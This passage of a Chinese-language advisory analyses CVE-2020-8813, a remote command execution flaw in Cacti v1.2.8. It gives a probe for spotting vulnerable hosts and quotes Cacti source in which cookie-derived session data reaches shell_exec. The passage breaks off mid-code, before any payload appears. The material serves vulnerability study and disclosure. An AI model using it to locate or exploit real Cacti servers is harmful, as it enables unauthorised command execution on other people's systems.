<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-8813cacti-v128-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-8813</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Cacti v1.2.8 </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">需要拥有登录账号密码；或者网站启用了</span><span class="cs8926E06">&ldquo; Gest Realtime Graphs&rdquo;</span><span class="cs9C1B1871">特权功能。</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">1</span><span class="cs9C1B1871">、判断是否存在</span><span class="cs8926E06">&ldquo;/graph_realtime.php?action=init&rdquo;</span><span class="cs9C1B1871">链接</span></li><li class="cs24C36B3"><span class="cs8926E06">2</span><span class="cs9C1B1871">、判断</span><span class="cs8926E06">1</span><span class="cs9C1B1871">、存在</span><span class="cs8926E06">&ldquo;poller_realtime.php&rdquo;</span><span class="cs9C1B1871">字样，则存在漏洞。</span></li></ul>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Cacti v1.2.8</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我通过分析</span><span class="cs8926E06">Cacti</span><span class="cs9C1B1871">主要代码中的多个功能的代码发现了此漏洞，我必须将多个因素联系在一起才能执行代码，该漏洞主要发生在攻击者尝试将恶意代码注入</span><span class="cs8926E06">&ldquo; Cacti&rdquo; cookie</span><span class="cs9C1B1871">变量时，在与一些字符串连接后被传递给</span><span class="cs8926E06">shell_exec</span><span class="cs9C1B1871">函数，但是当我尝试操作</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">值时会遇到身份验证问题，这将使我无法访问该页面，因此解决了我注意到可以按以下方式访问易受攻击的页面：一个不需要进行身份验证即可访问的</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">来宾</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">，因此我链接了我的漏洞利用程序，以启用</span><span class="cs8926E06">&ldquo; graph_realtime.php&rdquo;</span><span class="cs9C1B1871">页面的</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">来宾</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">视图，然后发出恶意请求，以便在主机上执行代码。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为了完成这项工作，首先，我需要向</span><span class="cs8926E06">&ldquo; user_admin.php&rdquo;</span><span class="cs9C1B1871">页面发送请求以启用</span><span class="cs8926E06">realtime_graph</span><span class="cs9C1B1871">的</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">来宾</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">特权，然后再次将恶意请求发送至</span><span class="cs8926E06">&ldquo; graph_realtime.php&rdquo;</span><span class="cs9C1B1871">页面。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因此，我像往常一样从</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/mhaskar/RCEScanner"><span class="cs1C2E50E7">超级简单的</span><span class="cs4B51D5E4">RCE</span><span class="cs1C2E50E7">扫描器</span></a></span><span class="cs9C1B1871">脚本开始，以在</span><span class="cs8926E06">Cacti</span><span class="cs9C1B1871">中寻找</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">运行脚本后，在</span><span class="cs8926E06">&ldquo; graph_realtime.php&rdquo;</span><span class="cs9C1B1871">文件中得到了一个有趣的结果：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">graph_realtime.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">/* call poller */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$graph_rrd = read_config_option(&#39;realtime_cache_path&#39;) . &#39;/user_&#39; . session_id() . &#39;_lgi_&#39; . get_request_var(&#39;local_graph_id&#39;) . &#39;.png&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$command &nbsp;&nbsp;= read_config_option(&#39;path_php_binary&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$args &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= sprintf(&#39;poller_realtime.php --graph=%s --interval=%d --poller_id=&#39; . session_id(), get_request_var(&#39;local_graph_id&#39;), $graph_data_array[&#39;ds_step&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shell_exec(&quot;$command $args&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/* construct the image name &nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$graph_data_array[&#39;export_realtime&#39;] = $graph_rrd;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$graph_data_array[&#39;output_flag&#39;] &nbsp;&nbsp;&nbsp;&nbsp;= RRDTOOL_OUTPUT_GRAPH_DATA;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$null_param = array();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从行号</span><span class="cs8926E06">170</span><span class="cs9C1B1871">和</span><span class="cs8926E06">171</span><span class="cs9C1B1871">中可以看到，我们正在接收几个参数并将它们连接在一起，我们还可以看到有一个名为</span><span class="cs8926E06">&ldquo; get_request_var&rdquo;</span><span class="cs9C1B1871">的函数，该函数执行以下操作：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">html_utility.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">function get_request_var($name, $default = &#39;&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;global $_CACTI_REQUEST;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$log_validation = read_config_option(&#39;log_validation&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (isset($_CACTI_REQUEST[$name])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $_CACTI_REQUEST[$name];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} elseif (isset_request_var($name)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($log_validation == &#39;on&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html_log_input_error($name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_request_var($name, $_REQUEST[$name]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $_REQUEST[$name];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $default;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">正如我们所看到的，该函数将通过</span><span class="cs8926E06">&ldquo; set_request_var&rdquo;</span><span class="cs9C1B1871">函数处理输入并设置参数值，该函数将执行以下操作：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">html_utility.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">function set_request_var($variable, $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;global $_CACTI_REQUEST;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$_CACTI_REQUEST[$variable] = $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$_REQUEST[$variable] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$_POST[$variable] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$_GET[$variable] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因此，回到我们的</span><span class="cs8926E06">&ldquo; graph_realtime.php&rdquo;</span><span class="cs9C1B1871">，我们可以看到我们可以控制以下几个输入：</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">local_graph_id</span></li><li class="cs24C36B3"><span class="cs8926E06">$ graph_data_array [&#39;ds_step&#39;]</span><span class="cs9C1B1871">的值</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">但不幸的是，由于以下几个原因，我们不能这样做：首先，我们注意到</span><span class="cs8926E06">graph_realtime.php</span><span class="cs9C1B1871">文件中的第</span><span class="cs8926E06">171</span><span class="cs9C1B1871">行使用</span><span class="cs8926E06">sprintf</span><span class="cs9C1B1871">来处理输入，并且我们可以看到第一个值</span><span class="cs8926E06">&ldquo; graph&rdquo;</span><span class="cs9C1B1871">充满了我们可以控制的值</span><span class="cs8926E06">&ldquo; local_graph_id&rdquo;</span><span class="cs9C1B1871">！但是再次不幸的是，该值将被名为</span><span class="cs8926E06">&ldquo; get_filter_request_var&rdquo;</span><span class="cs9C1B1871">的函数过滤，我们可以看到它的值已在</span><span class="cs8926E06">graph_realtime.php</span><span class="cs9C1B1871">第</span><span class="cs8926E06">38</span><span class="cs9C1B1871">行中过滤，如下所示：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">html_utility.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">function get_filter_request_var($name, $filter = FILTER_VALIDATE_INT, $options = array()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (isset_request_var($name)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isempty_request_var($name)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_request_var($name, get_nfilter_request_var($name));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return get_request_var($name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif (get_nfilter_request_var($name) == &#39;undefined&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isset($options[&#39;default&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_request_var($name, $options[&#39;default&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $options[&#39;default&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_request_var($name, &#39;&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (get_nfilter_request_var($name) == &#39;0&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = &#39;0&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif (get_nfilter_request_var($name) == &#39;undefined&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isset($options[&#39;default&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = $options[&#39;default&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif (isempty_request_var($name)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif ($filter == FILTER_VALIDATE_IS_REGEX) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_base64_encoded($_REQUEST[$name])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_REQUEST[$name] = utf8_decode(base64_decode($_REQUEST[$name]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valid = validate_is_regex($_REQUEST[$name]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($valid === true) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = $_REQUEST[$name];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$custom_error = $valid;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_ARRAY) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valid = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_array($_REQUEST[$name])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($_REQUEST[$name] AS $number) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!is_numeric($number)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valid = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valid = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($valid == true) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = $_REQUEST[$name];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_LIST) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valid = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$values = preg_split(&#39;/,/&#39;, $_REQUEST[$name], NULL, PREG_SPLIT_NO_EMPTY);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($values AS $number) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!is_numeric($number)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valid = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span 